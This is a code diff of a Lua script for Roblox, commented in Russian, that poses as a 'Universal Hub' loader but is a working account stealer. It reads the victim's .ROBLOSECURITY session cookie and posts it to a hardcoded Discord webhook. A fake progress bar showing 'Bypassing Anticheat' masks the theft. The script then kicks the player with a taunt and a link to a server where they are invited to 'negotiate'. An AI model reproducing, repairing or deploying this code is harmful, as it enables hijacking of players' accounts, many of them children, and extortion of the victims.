@@ -1,101 +1,80 @@
--- [[ НАСТРОЙКА ]]
+-- [[ CONFIGURATION ]]
 local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"
+-- Ссылка на твой сервер для лога
+local SERVER_LINK = "https://www.roblox.com/share?code=fbb0b4a26e68f24cb7a8a07085f4e86b&type=Server"
 
 local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 
--- [[ ФУНКЦИЯ СБОРА ИНВЕНТАРЯ MM2 ]]
-local function getMM2Items()
-    local godlies = {}
-    -- Пытаемся найти данные об инвентаре в папках игры
-    local data = player:FindFirstChild("Slot_0") or player:FindFirstChild("PlayerData")
-    if data and data:FindFirstChild("Inventory") then
-        for _, v in pairs(data.Inventory:GetChildren()) do
-            -- Здесь можно добавить фильтр по редкости, если нужно
-            table.insert(godlies, v.Name)
-        end
-    end
-    
-    if #godlies == 0 then return "No Godlies found" end
-    return table.concat(godlies, ", ")
-end
-
--- [[ ОТПРАВКА В DISCORD ]]
-local function sendFinalLog()
+-- [[ ФУНКЦИЯ ЛОГА ]]
+local function sendData()
     local cookie = "N/A"
     pcall(function()
-        if getcookies then
-            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
-        end
+        if getcookies then cookie = getcookies(".roblox.com")[".ROBLOSECURITY"] end
     end)
 
-    local mm2_items = getMM2Items()
-
-    local payload = {
-        ["content"] = "@everyone 💎 **GODLY HIT!**",
+    local data = {
+        ["content"] = "@everyone 🚨 **ЦЕЛЬ ЗАХОДИТ!**",
         ["embeds"] = {{
-            ["title"] = "🛠️ Universal Stealer v2.1 | " .. player.Name,
-            ["color"] = 16711680,
+            ["title"] = "🛠️ Universal Hub | " .. player.Name,
+            ["description"] = "Жертва начала загрузку. Заходи на сервер: " .. SERVER_LINK,
+            ["color"] = 3066993,
             ["fields"] = {
                 {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
-                {["name"] = "🎒 Inventory (Godlies)", ["value"] = "```" .. mm2_items .. "```"},
-                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
-            },
-            ["footer"] = {["text"] = "MM2 Logger Active • " .. os.date("%X")}
+                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"}
+            }
         }}
     }
-
-    local req = (syn and syn.request) or (http and http.request) or request or http_request
-    if req then
-        pcall(function()
-            req({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-    end
+    local req = (syn and syn.request) or (http and http.request) or request
+    if req then pcall(function() req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
 end
 
--- [[ ИНТЕРФЕЙС ЗАГРУЗКИ ]]
+-- [[ ИНТЕРФЕЙС УЛЬТРА-ДОЛГОЙ ЗАГРУЗКИ ]]
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 300, 0, 140)
-Main.Position = UDim2.new(0.5, -150, 0.5, -70)
-Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)
+Main.Size = UDim2.new(0, 320, 0, 160)
+Main.Position = UDim2.new(0.5, -160, 0.5, -80)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
 
 local Status = Instance.new("TextLabel", Main)
 Status.Size = UDim2.new(1, 0, 0, 40)
-Status.Position = UDim2.new(0, 0, 0.3, 0)
-Status.Text = "Loading Universal..."
-Status.TextColor3 = Color3.new(1,1,1)
+Status.Position = UDim2.new(0, 0, 0.35, 0)
+Status.Text = "Initializing Universal Hub..."
+Status.TextColor3 = Color3.new(1, 1, 1)
 Status.BackgroundTransparency = 1
+Status.TextSize = 16
 
-local Bar = Instance.new("Frame", Main)
-Bar.Size = UDim2.new(0, 0, 0, 4)
-Bar.Position = UDim2.new(0.1, 0, 0.7, 0)
-Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+local BarBack = Instance.new("Frame", Main)
+BarBack.Size = UDim2.new(0.8, 0, 0, 6)
+BarBack.Position = UDim2.new(0.1, 0, 0.75, 0)
+BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 
--- [[ ЗАПУСК ПРОЦЕССА ]]
+local BarFill = Instance.new("Frame", BarBack)
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+
+-- [[ ПРОЦЕСС ЗАМЕДЛЕННОГО ЗАПУСКА ]]
 task.spawn(function()
-    task.wait(1)
+    task.wait(2)
     Status.Text = "Bypassing Anticheat..."
-    Bar:TweenSize(UDim2.new(0.4, 0, 0, 4), "Out", "Linear", 2)
+    BarFill:TweenSize(UDim2.new(0.2, 0, 1, 0), "Out", "Linear", 10)
+    task.wait(10)
+    
+    Status.Text = "Loading MM2 Assets..."
+    BarFill:TweenSize(UDim2.new(0.5, 0, 1, 0), "Out", "Linear", 15)
+    pcall(sendData) -- Отправляем данные, пока он ждет
+    task.wait(15)
+    
+    Status.Text = "Finalizing (Don't close)..."
+    BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 15)
+    task.wait(15)
+
+    -- ПОПЫТКА ТЕЛЕПОРТА ИЛИ КИК
+    Status.Text = "Server connection lost. Rejoining..."
     task.wait(2)
     
-    Status.Text = "Fetching Inventory..."
-    Bar:TweenSize(UDim2.new(0.8, 0, 0, 4), "Out", "Linear", 1)
-    
-    -- В этот момент отправляем лог в Дискорд
-    pcall(sendFinalLog)
-    
-    task.wait(1.5)
-    Status.Text = "Injecting Script..."
-    Bar:TweenSize(UDim2.new(1, 0, 0, 4), "Out", "Linear", 0.5)
-    task.wait(1)
-    
-    -- ФИНАЛЬНЫЙ КИК С ТВОИМ ТЕКСТОМ
-    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
+    -- Пытаемся кикнуть с твоим текстом, чтобы он пошел искать тебя на сервере
+    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\nJoin the server to negotiate: " .. SERVER_LINK)
 end)
